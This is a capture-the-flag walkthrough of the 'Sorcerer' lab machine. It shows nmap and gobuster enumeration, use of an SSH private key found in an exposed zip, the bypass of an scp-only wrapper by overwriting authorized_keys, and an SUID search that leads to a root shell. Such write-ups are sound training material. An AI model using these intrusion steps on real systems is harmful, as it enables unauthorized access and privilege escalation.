# Sorcerer

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.168.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 13:52 +08
Nmap scan report for 192.168.168.100
Host is up (0.17s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7742/tcp  open  msss
33603/tcp open  unknown
41637/tcp open  unknown
42193/tcp open  unknown
59253/tcp open  unknown
```

Did a detailed scan in case:

```
$ sudo nmap -p 80,111,2049,7742,33603,41637 -sC -sV --min-rate 5000 -Pn 192.168.168.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 13:55 +08
Nmap scan report for 192.168.168.100
Host is up (0.21s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      41637/tcp   mountd
|   100005  1,2,3      52180/udp   mountd
|   100021  1,3,4      42193/tcp   nlockmgr
|   100021  1,3,4      58389/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl 3 (RPC #100227)
7742/tcp  open  http    nginx
|_http-title: SORCERER
33603/tcp open  mountd  1-3 (RPC #100005)
41637/tcp open  mountd  1-3 (RPC #100005)
```

NFS and Port 7742 look the most promising.

### NFS Enumeration -> Dead End

I first enumerated NFS to see if there was anything to mount:

```
$ showmount -e 192.168.168.100 
Export list for 192.168.168.100:
```

There was nothing, so let's move on.

### Web Enumeration -> Zipfiles

Port 7742 just shows us a login page:

<figure><img src="../../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` directory scan while I tested some weak default passwords. I found a few directories present:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.168.100:7742/ -t 100  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.168.100:7742/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/10 13:58:45 Starting gobuster in directory enumeration mode
===============================================================
/default              (Status: 301) [Size: 178] [--> http://192.168.168.100:7742/default/]
/zipfiles             (Status: 301) [Size: 178] [--> http://192.168.168.100:7742/zipfiles/]
```

The `/zipfiles` directory looks the most interesting. Within it, there were zip files named after the users on the machine:

<figure><img src="../../../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>

`max.zip` was the largest and hence the only one I downloaded. When unzipped, it contained all the files like his SSH key:

```
$ unzip max.zip       
Archive:  max.zip
   creating: home/max/
  inflating: home/max/.bash_logout   
  inflating: home/max/.profile       
   creating: home/max/.ssh/
  inflating: home/max/.ssh/id_rsa.pub  
  inflating: home/max/.ssh/authorized_keys  
  inflating: home/max/.ssh/id_rsa    
  inflating: home/max/tomcat-users.xml.bak  
  inflating: home/max/.bashrc        
  inflating: home/max/scp_wrapper.sh
```

However, attempts to SSH in as `max` fail.

```
$ ssh -i home/max/.ssh/id_rsa max@192.168.168.100
PTY allocation request failed on channel 0
ACCESS DENIED
```

It seems that something is blocking us. When we read the `scp_wrapper.sh` file, we see that `ssh` is being blocked, but not `scp`:

```bash
$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

Since `scp` is allowed, we can transfer our public key into the `authorized_keys` folder:

```
$ scp -O -i id_rsa ~/.ssh/id_rsa.pub max@192.168.168.100:/home/max/.ssh/authorized_keys
id_rsa.pub                                                 100%  391     2.2KB/s   00:00
```

Afterwards. we can just `ssh` in:

<figure><img src="../../../.gitbook/assets/image (3490).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SUID Binary -> Root Shell

I did a search for SUID binaries on the machine:

```
$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.nfs
/usr/sbin/start-stop-daemon
<TRUNCATED>
```

`start-stop-daemon` is an SUID binary, and it can spawn a `root` shell for us.&#x20;

![](<../../../.gitbook/assets/image (2203).png>)
